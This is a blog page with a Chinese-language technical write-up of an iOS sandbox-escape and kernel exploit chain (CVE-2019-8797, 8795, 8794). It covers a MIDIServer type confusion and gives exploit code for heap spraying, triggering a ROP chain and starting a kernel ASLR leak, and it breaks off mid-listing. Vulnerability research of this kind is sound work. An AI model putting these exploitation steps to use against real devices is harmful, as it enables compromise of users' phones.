<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>Tag: ios - buffer0verflooow - Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="buffer0verflooow - Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="buffer0verflooow - Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="buffer0verflooow - Blog"><meta property="og:url" content="https://buffer0verflooow.github.io/"><meta property="og:site_name" content="buffer0verflooow - Blog"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://buffer0verflooow.github.io/img/og_image.png"><meta property="article:author" content="buffer0verflooow"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://buffer0verflooow.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://buffer0verflooow.github.io"},"headline":"buffer0verflooow - Blog","image":["https://buffer0verflooow.github.io/img/og_image.png"],"author":{"@type":"Person","name":"buffer0verflooow"},"publisher":{"@type":"Organization","name":"buffer0verflooow - Blog","logo":{"@type":"ImageObject","url":"https://buffer0verflooow.github.io/img/logo.svg"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">ios</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-12-12T10:36:57.000Z" title="2021/12/12 18:36:57">2021-12-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-03T13:26:13.925Z" title="2022/5/3 21:26:13">2022-05-03</time></span><span class="level-item">29 minutes read (About 4416 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/12/iOS-RCE-CVE-2019-8797-CVE-2019-8795-CVE-2019-8794/">iOS RCE: CVE-2019-8797,CVE-2019-8795,CVE-2019-8794</a></p><div class="content"><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这三个漏洞是在iOS12.3.1中发现的，将这些漏洞进行组合，能够实现在内核中执行代码。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>在iOS 13.2，iPadOS 13.2，macOS Catalina 10.15.1，tvOS 13.2，watchOS 6.1中进行了修复。</p>
<h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><p>与内核相反，许多在用户空间中运行的守护进程可以通过默认的应用程序沙箱访问。<code>MIDIServer(com.apple.midiserver)</code>允许应用程序和其他服务与可能连接到设备的MIDI硬件进行交互。</p>
<p><code>MIDIServer</code>二进制文件本身相当简单，它是一个 stub 二进制文件，它的所有功能实际上都存储在一个库中，该库是共享缓存<code>(CoreMIDI)</code>的一部分：<code>MIDIServer</code>的<code>main</code>函数只是调用<code>MIDIServerRun()</code>函数。</p>
<p><code>CoreMIDI</code>然后设置两个沙箱可访问的Mach服务，<a target="_blank" rel="noopener" href="http://com.apple.midiserver和com.apple.midiserver.io/"><code>com.apple.midiserver和com.apple.midiserver.io</code></a>。前者是典型的基于MIG的Mach服务器，它实现了47种方法。然而<code>com.apple.midiserver.io</code>是一个自定义实现，用于在客户端和服务器之间传输IO缓冲区。</p>
<p><code>IO Mach server</code>主线程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">MIDIIOThread::Run</span><span class="params">(MIDIIOThread *this, __int64 a2, __int64 a3, <span class="type">int</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  x0 = XMachServer::CreateServerPort(<span class="string">&quot;com.apple.midiserver.io&quot;</span>, <span class="number">3</span>, this + <span class="number">140</span>, a4);</span><br><span class="line">  *(this + <span class="number">36</span>) = x0;</span><br><span class="line">  <span class="keyword">if</span> ( !*(this + <span class="number">35</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    server_port = x0;</span><br><span class="line">    *(this + <span class="number">137</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      bufsz = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( XServerMachPort::ReceiveMessage(&amp;server_port, &amp;msg_cmd, &amp;msg_buf, &amp;bufsz) || msg_cmd == <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef(&amp;v10, msg_buf);</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( msg_cmd == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ClientProcess::WriteDataAvailable(v12);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( msg_cmd == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ClientProcess::EmptiedReadBuffer(v12);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        applesauce::experimental::sync::LockFreeHashTable&lt;<span class="type">unsigned</span> <span class="type">int</span>,BaseOpaqueObject *,(applesauce::experimental::sync::LockFreeHashTableOptions)<span class="number">1</span>&gt;::Lookup::~Lookup(&amp;v11);</span><br><span class="line">        LOBYTE(v10) = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    x0 = XServerMachPort::~XServerMachPort(&amp;server_port);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>XServerMachPort::ReceiveMessage</code>使用<code>MACH_RCV_MSG</code>参数调用<code>mach_msg</code>，等待该端口上的消息。这个消息包含一个命令ID和一个长度字段，后面是消息的主体，由<code>ReceiveMessage</code>调用解析。提供了三个命令：命令1将调用<code>ClientProcess::WriteDataAvailable</code>，命令2将调用<code>ClientProcess::EmptiedReadBuffer</code>，命令3将退出Mach服务循环。通过<code>ResolvedOpaqueRef</code>找到传递给<code>ClientProcess</code>调用的v12对象。这个方法将使用消息中提供的4字节缓冲区(对象ID)在哈希表中查找，将对象返回到堆栈上。</p>
<p>这漏洞存在于<code>ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef</code>函数中。</p>
<p>这个方法使用的哈希表实际上包含许多不同类型的对象，而不仅仅是<code>ClientProcess</code>类型的对象。例如，<code>MIDIExternalDeviceCreate</code>和<code>MIDIDeviceAddEntity</code>创建的对象都存储在此哈希表中。</p>
<p>如果进行正确的类型检查，这里就没有问题。但是，实际上，有两种访问此哈希表的方法：</p>
<ol>
<li><code>BaseOpaqueObject::ResolveOpaqueRef</code></li>
<li><code>ResolvedOpaqueRef&lt;ClientProcess&gt;::ResolvedOpaqueRef</code></li>
</ol>
<p>第一种在<code>_MIDIDeviceAddEntity</code>方法中使用，包含正确的类型检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">midi_device = BaseOpaqueObject::ResolveOpaqueRef(&amp;TOpaqueRTTI&lt;MIDIDevice&gt;::sRTTI, device_id);</span><br></pre></td></tr></table></figure>

<p>但是，第二种没有。这意味着，通过不同类型对象的 ID，可以在其中一个<code>ClientProcess</code>调用中导致类型混淆，而该方法需要<code>ClientProcess*</code>类型的对象。</p>
<p>查看<code>EmptiedReadBuffer</code>的调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">; __int64 MIDIIOThread::Run(MIDIIOThread *this)</span><br><span class="line">__ZN12MIDIIOThread3RunEv</span><br><span class="line">[...]</span><br><span class="line">BL              __ZN13ClientProcess17EmptiedReadBufferEv ; ClientProcess::EmptiedReadBuffer(x0) // `x0` is potentially type confused</span><br><span class="line"></span><br><span class="line">; __int64 ClientProcess::EmptiedReadBuffer(ClientProcess *this)</span><br><span class="line">__ZN13ClientProcess17EmptiedReadBufferEv</span><br><span class="line">                STP             X20, X19, [SP,#-0x10+var_10]!</span><br><span class="line">                STP             X29, X30, [SP,#0x10+var_s0]</span><br><span class="line">                ADD             X29, SP, #0x10</span><br><span class="line">                MOV             X19, X0</span><br><span class="line">                ADD             X0, X0, #0x20 ; this</span><br><span class="line">                BL              __ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv ; MIDIIORingBufferWriter::EmptySecondaryQueue(x0)</span><br><span class="line"></span><br><span class="line">; bool MIDIIORingBufferWriter::EmptySecondaryQueue(MIDIIORingBufferWriter *this)</span><br><span class="line">__ZN22MIDIIORingBufferWriter19EmptySecondaryQueueEv</span><br><span class="line"></span><br><span class="line">                STP             X28, X27, [SP,#-0x10+var_50]!</span><br><span class="line">                STP             X26, X25, [SP,#0x50+var_40]</span><br><span class="line">                STP             X24, X23, [SP,#0x50+var_30]</span><br><span class="line">                STP             X22, X21, [SP,#0x50+var_20]</span><br><span class="line">                STP             X20, X19, [SP,#0x50+var_10]</span><br><span class="line">                STP             X29, X30, [SP,#0x50+var_s0]</span><br><span class="line">                ADD             X29, SP, #0x50</span><br><span class="line">                MOV             X21, X0</span><br><span class="line">                MOV             X19, X0 ; x19 = (MIDIIORingBufferWritter *)this</span><br><span class="line">                LDR             X8, [X19,#0x58]!</span><br><span class="line">                LDR             X8, [X8,#0x10]</span><br><span class="line">                MOV             X0, X19</span><br></pre></td></tr></table></figure>

<p>如上所见，<code>EmptiedReadBuffer</code>代码将立即解除类型混淆对象中的两个指针的引用，并将其转移到一个可以被攻击者控制的地址，这个调用看起来是这样：<code>obj→0x78→0x10(obj→0x20)</code>。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>为了利用这个漏洞，我们可以将<code>ClientProcess</code>类型与<code>MIDIEntity</code>实例混淆。<code>MIDIEntity</code>的大小为<code>0x78</code>，这表示着对象执行的第一次取消引用将超出内存范围。然后，可以在<code>MIDIEntity</code>对象之后对一些受控制的数据进行对齐，因为我们处于用户态，所以有更好的方法。</p>
<p><code>MIDIObjectSetDataProperty</code> API调用将把<code>CoreFoundation</code>对象反序列化到<code>MIDIServer</code>的堆中，因此使用这个调用可以喷射大小为<code>0x90</code>的<code>CFData</code>对象。然后利用此漏洞发送两个包含OOL内存描述符的Mach消息，将其映射到静态地址<code>0x29f000000</code>(由于某些原因，需要发送两次该消息，否则将不会立即映射内存，尚不确定原因)，这个内存是一个连续的CoW映射，包含稍后要使用的ROP链，而且重要的是一个位于<code>0x10</code>偏移处的函数指针，将被<code>EmptySecondaryQueue</code>取消引用。</p>
<p>下面的代码将设置<code>CFData</code>对象被加入<code>MIDIServer</code>的堆中：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Prepare_bunch_keys(); <span class="comment">// For iterating</span></span><br><span class="line">  size_t spraybufsize = <span class="number">0x90</span>;</span><br><span class="line">  <span class="type">void</span> *spraybuf = malloc(spraybufsize);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;spraybufsize; i+=<span class="number">0x8</span>)&#123;</span><br><span class="line">      *(uint64_t*)(spraybuf + i) = SPRAY_ADDRESS; <span class="comment">// The 0x29f000000 address</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">CFDataRef</span> spraydata = <span class="built_in">CFDataCreate</span>(kCFAllocatorDefault, spraybuf, spraybufsize);</span><br></pre></td></tr></table></figure>

<p>堆的构造：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// OSStatus MIDIClientCreate(CFStringRef name, MIDINotifyProc notifyProc, void *notifyRefCon, MIDIClientRef *outClient);</span></span><br><span class="line">uint32_t mclient_id = <span class="number">0</span>;</span><br><span class="line">MIDIClientCreate(<span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), useless_notify, <span class="literal">NULL</span>, &amp;mclient_id);</span><br><span class="line">printf(<span class="string">&quot;MIDI Client ID: 0x%xn&quot;</span>, mclient_id);</span><br><span class="line"></span><br><span class="line"><span class="comment">// OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);</span></span><br><span class="line">uint32_t mdevice_id = <span class="number">0</span>;</span><br><span class="line">MIDIExternalDeviceCreate(<span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), &amp;mdevice_id);</span><br><span class="line">printf(<span class="string">&quot;MIDI Device ID: 0x%xn&quot;</span>, mdevice_id);</span><br><span class="line"></span><br><span class="line"><span class="comment">// OSStatus MIDIObjectSetDataProperty(MIDIObjectRef obj, CFStringRef propertyID, CFDataRef data);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">300</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    MIDIObjectSetDataProperty(mdevice_id, bunchkeys[i], spraydata); <span class="comment">// Each call will unserialize one CFData object of size 0x90 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sends 1 OOL descriptor each with the spray memory mapping </span></span><br><span class="line">Send_spray_mem();</span><br><span class="line">Send_spray_mem();</span><br><span class="line"></span><br><span class="line"><span class="comment">// OSStatus MIDIObjectRemoveProperty(MIDIObjectRef obj, CFStringRef propertyID);</span></span><br><span class="line"><span class="comment">// Removes every other property we just added</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">300</span>; i = i + <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    MIDIObjectRemoveProperty(mdevice_id, bunchkeys[i]); <span class="comment">// Free&#x27;s the CFData object, popping holes on the heap </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们现在分配了<code>150</code>个<code>CFData</code>和<code>150</code>个大小为<code>0x90</code>的空闲空间，全部包含<code>SPRAY_ADDRESS</code>指针。下一步是使用<code>MIDIEntity</code>对象填充其中一个漏洞：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint32_t mentity_id = <span class="number">0</span>;</span><br><span class="line">MIDIDeviceAddEntity(mdevice_id, <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="literal">false</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;mentity_id);</span><br><span class="line">printf(<span class="string">&quot;mentity_id = 0x%xn&quot;</span>, mentity_id);</span><br></pre></td></tr></table></figure>

<p>如果一切按计划进行，那么现在应该在堆上有一块内存，其中第一个<code>0x78</code>字节用有效的<code>MIDIEntity</code>对象填充，剩下的<code>0x18</code>字节用<code>SPRAY_ADDRESS</code>指针填充。</p>
<p>为了触发这个漏洞，我们可以使用<code>MIDIEntity</code>对象<code>ID(mentity_id)</code><a target="_blank" rel="noopener" href="http://调用com.apple.midiserver.io/">调用<code>com.apple.midiserver.io</code></a> Mach服务：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sends msgh_id 0 with cmd 2 and datalen 4 (ClientProcess::EmptiedReadBuffer)</span></span><br><span class="line">Init_triggerExp_msg(mentity_id);</span><br><span class="line">Send_triggerExp_msg();</span><br></pre></td></tr></table></figure>

<p>它将启动<code>MIDIServer</code>进程中Mach服务线程上的ROP链。</p>
<p>然后根据新对象的ID判断是否触发漏洞：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// OSStatus MIDIExternalDeviceCreate(CFStringRef name, CFStringRef manufacturer, CFStringRef model, MIDIDeviceRef *outDevice);</span></span><br><span class="line">uint32_t verifysucc_mdevice_id = <span class="number">0</span>;</span><br><span class="line">MIDIExternalDeviceCreate(<span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), <span class="built_in">CFSTR</span>(<span class="string">&quot;&quot;</span>), &amp;verifysucc_mdevice_id);</span><br><span class="line">printf(<span class="string">&quot;verify_mdevice_id: 0x%xn&quot;</span>, verifysucc_mdevice_id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (verifysucc_mdevice_id == mdevice_id + <span class="number">2</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We failed, reattempting...</span></span><br><span class="line">printf(<span class="string">&quot;Try againn&quot;</span>);</span><br><span class="line">MIDIRestart();</span><br></pre></td></tr></table></figure>

<p>如果对象不连续，则表示利用失败(守护进程崩溃)，因此可以通过<code>MIDIRestart</code>调用重新启动守护进程，然后可以重新尝试利用漏洞。</p>
<p>这里ROP链的基本思路是在<code>SPRAY_ADDRESS</code>内存映射中的缓冲区上调用<code>objc_release</code>，在这个地址上伪造一个假的<code>Objective-C</code>对象，在这个对象上执行release方法。然后创建一个原始的调用链，目的是打开3个<code>userclients</code>，并挂在<code>mach_msg_receive</code>调用中，以便稍后在收到消息时通过<code>vm_read_overwrite</code>覆盖一些内存，这将在稍后的内核利用中使用。</p>
<p>需要注意的是，对于这种基于ROP的利用方法，A12和更新的处理器需要绕过PAC。</p>
<p>从<code>MIDIServer</code>获取的<code>userclients</code>是<code>AppleSPUProfileDriver</code>、<code>IOSurfaceRoot</code>和<code>AppleAVE2Driver</code>。</p>
<h3 id="使用AppleSPUProfileDriver-攻破内核ASLR"><a href="#使用AppleSPUProfileDriver-攻破内核ASLR" class="headerlink" title="使用AppleSPUProfileDriver:攻破内核ASLR"></a>使用AppleSPUProfileDriver:攻破内核ASLR</h3><p>通过<code>MIDIServer</code>我们可以访问<code>AppleSPUProfileDriver</code> <code>userclient</code>，这个<code>userclient</code>实现了12个方法，但是我们只对<code>AppleSPUProfileDriverUserClient::extSignalBreak</code>感兴趣。查看伪代码：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *<span class="variable language_">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 dataQueueLock; <span class="comment">// x19</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// x0</span></span><br><span class="line">  __int64 result; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [xsp+8h] [xbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [xsp+Ch] [xbp-44h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [xsp+10h] [xbp-40h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [xsp+38h] [xbp-18h]</span></span><br><span class="line"></span><br><span class="line">  dataQueueLock = <span class="variable language_">this</span>-&gt;dataQueueLock;</span><br><span class="line">  IORecursiveLockLock(<span class="variable language_">this</span>-&gt;dataQueueLock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="variable language_">this</span>-&gt;dataQueue )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    abs_time = mach_absolute_time();</span><br><span class="line">    v12 = AppleSPUProfileDriver::absolutetime_to_sputime(<span class="variable language_">this</span>, abs_time);</span><br><span class="line">    v11 = OSIncrementAtomic(&amp;<span class="variable language_">this</span>-&gt;atomicCount);</span><br><span class="line">    (*(*<span class="variable language_">this</span>-&gt;dataQueue + <span class="number">0x88</span>âˆ‚LL))();           <span class="comment">// IOSharedDataQueue::enqueue(&amp;v10, 0x30)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  result = IORecursiveLockUnlock(dataQueueLock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数通过一个锁，将一些数据写入堆栈上存储的缓冲区，并调用<code>IOSharedDataQueue::enqueue</code>将该数据提交到对立，缓冲区大小为<code>0x30</code>。这里访问堆栈的方式不是很清楚，所以看一下汇编代码：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">; __int64 AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *<span class="variable language_">this</span>)</span><br><span class="line">__ZN21AppleSPUProfileDriver16signalBreakGatedEv</span><br><span class="line"></span><br><span class="line">var_48          = <span class="number">-0x48</span></span><br><span class="line">var_44          = <span class="number">-0x44</span></span><br><span class="line">var_40          = <span class="number">-0x40</span></span><br><span class="line">var_18          = <span class="number">-0x18</span></span><br><span class="line">var_10          = <span class="number">-0x10</span></span><br><span class="line">var_s0          =  <span class="number">0</span></span><br><span class="line"></span><br><span class="line">                PACIBSP</span><br><span class="line">                SUB             SP, SP, #<span class="number">0x60</span></span><br><span class="line">                STP             X20, X19, [SP,#<span class="number">0x50</span>+var_10]</span><br><span class="line">                STP             X29, X30, [SP,#<span class="number">0x50</span>+var_s0]</span><br><span class="line">                ADD             X29, SP, #<span class="number">0x50</span></span><br><span class="line">                MOV             X20, X0</span><br><span class="line">                ADRP            X8, #___stack_chk_guard@PAGE</span><br><span class="line">                NOP</span><br><span class="line">                LDR             X8, [X8,#___stack_chk_guard@PAGEOFF]</span><br><span class="line">                STUR            X8, [X29,#var_18]</span><br><span class="line">                LDR             X19, [X0,#<span class="number">0x30B8</span>]</span><br><span class="line">                MOV             X0, X19</span><br><span class="line">                BL              _IORecursiveLockLock</span><br><span class="line">                LDR             X8, [X20,#<span 